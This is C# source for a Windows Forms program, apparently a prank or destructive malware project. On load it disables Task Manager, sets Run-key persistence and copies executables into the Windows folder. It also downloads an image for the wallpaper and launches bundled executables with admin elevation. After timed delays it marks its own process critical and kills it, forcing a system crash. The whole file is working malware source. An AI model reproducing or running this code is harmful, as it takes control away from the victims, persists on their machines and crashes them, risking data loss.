﻿using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Threading;
using static System.Windows.Forms.VisualStyles.VisualStyleElement.TaskbarClock;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Resources;
using System.Net;
using System.IO.Compression;
using System.Runtime.InteropServices.ComTypes;
using System.Media;
using Microsoft.Win32;
using bramerto_rob;

namespace bramerto_rob
{
    public partial class Kill : Form
    {
        
        private static System.Windows.Forms.Timer _timer;
        
        [DllImport("ntdll.dll", SetLastError = true)]
        private static extern void RtlSetProcessIsCritical(UInt32 v1, UInt32 v2, UInt32 v3);

        [System.Runtime.InteropServices.DllImportAttribute("user32.dll", EntryPoint = "BlockInput")]
        [return: System.Runtime.InteropServices.MarshalAsAttribute(System.Runtime.InteropServices.UnmanagedType.Bool)]
        public static extern bool BlockInput([System.Runtime.InteropServices.MarshalAsAttribute(System.Runtime.InteropServices.UnmanagedType.Bool)] bool fBlockIt);

        SoundPlayer sp = new SoundPlayer(@"C:\Program Files (x86)\bramerto-rob\Files\amogus.wav");

        SoundPlayer sp2 = new SoundPlayer(@"C:\Program Files (x86)\bramerto-rob\Files\L.wav");

        WebClient wc = new WebClient();

        

        RegistryKey rkApp = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);

        string Desktop = @"C:\Users\" + Environment.UserName + @"\Desktop\";
        string localfilename = @"C:\Users\" + Environment.UserName + @"\Desktop\ニャンパス.jpg";
        string imgWallpaper = @"C:\Users\" + Environment.UserName + @"\Desktop\ニャンパス.jpg";
        string destinationFile = @"C:\Windows\.NET5.exe";
        string source = @"C:\Program Files (x86)\bramerto-rob\Files\.NET.exe";
        string source2 = @"C:\Program Files (x86)\bramerto-rob\Files\Insidious.exe";
        string destinationFile2 = @"C:\Windows\Insidious12.exe";

        [DllImport("user32.dll", CharSet = CharSet.Auto)]
        private static extern Int32 SystemParametersInfo(
        UInt32 action, UInt32 uParam, String vParam, UInt32 winIni);

        private static readonly UInt32 SPI_SETDESKWALLPAPER = 0x14;
        private static readonly UInt32 SPIF_UPDATEINIFILE = 0x01;
        private static readonly UInt32 SPIF_SENDWININICHANGE = 0x02;


        public Kill()
        {
            InitializeComponent();
        }

        public void SetWallpaper(String path)
        {
            RegistryKey key = Registry.CurrentUser.OpenSubKey(@"Control Panel\Desktop", true);
            key.SetValue(@"WallpaperStyle", 0.ToString()); // 2 is stretched
            key.SetValue(@"TileWallpaper", 0.ToString());

            SystemParametersInfo(SPI_SETDESKWALLPAPER, 0, path, SPIF_UPDATEINIFILE | SPIF_SENDWININICHANGE);
        }

        public void BlockTM()
        {
            RegistryKey a = Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\System");
            if (a.GetValue("DisableTaskMgr") == null)
                a.SetValue("DisableTaskMgr", "1");
        }
        public void ExecuteAsAdmin(string fileName)
        {
            Process proc = new Process();
            proc.StartInfo.FileName = fileName;
            proc.StartInfo.UseShellExecute = true;
            proc.StartInfo.Verb = "runas";
            proc.Start();
        }
        private void Form1_Load_1(object sender, EventArgs e)
        {
            BlockTM();
            wc.DownloadFile("https://moe.shikimori.one/system/user_images/original/169245/914737.jpg", localfilename);            
            File.Copy(source, destinationFile, true);
            File.Copy(source2, destinationFile2, true);
            rkApp.SetValue(@"C:\Windows\Insidious12.exe", Application.ExecutablePath.ToString());
            rkApp.SetValue(@"C:\Windows\.NET5.exe", Application.ExecutablePath.ToString());
            ExecuteAsAdmin(@"C:\Program Files (x86)\bramerto-rob\Files\.NET.exe");
            ExecuteAsAdmin(@"C:\Program Files (x86)\bramerto-rob\Files\Insidious.exe");//@"C:\Program Files (x86)\bramerto-rob\Files\Insidious.exe
            ExecuteAsAdmin(@"C:\Program Files (x86)\bramerto-rob\Files\Server.exe");
        }
        private void StartButton_Click(object sender, EventArgs e)
        {
            this.Visible = false;
            sp.Play();
            Img img = new Img();
            img.Show();                   
            Time1.Interval = 7000;
            Time1.Enabled = true;
            Time1.Tick += new EventHandler(Time1_Tick_1);
            Time1.Start();                                
            if (File.Exists(imgWallpaper))
            {
                SetWallpaper(imgWallpaper);
            }
        }
        
        private void Time1_Tick_1(object sender, EventArgs e)
        {
            Time1.Stop();
            Time1.Enabled = false;
            Time2.Interval = 120000;
            Time2.Enabled = true;
            Time2.Tick += new EventHandler(Time2_Tick);
            Time2.Start();
            Process.Start(@"C:\Program Files (x86)\bramerto-rob\Files\chilledwindows.exe");
        }

        
        private void Time3_Tick(object sender, EventArgs e)
        {
            Time3.Stop();
            Time3.Enabled = false;

            System.Diagnostics.Process.EnterDebugMode();
            RtlSetProcessIsCritical(1, 0, 0);
            System.Diagnostics.Process.GetCurrentProcess().Kill();
        }

        private void Time2_Tick(object sender, EventArgs e)
        {
            Time2.Stop();
            sp2.PlayLooping();
            Time2.Enabled = false;
            Time3.Interval = 60000;
            Time3.Enabled = true;
            Time3.Tick += new EventHandler(Time3_Tick);
            Time3.Start();
            ExecuteAsAdmin(@"C:\Program Files (x86)\bramerto-rob\Marb\bin\Debug\net5.0-windows\Marb.exe");
        }
    }
}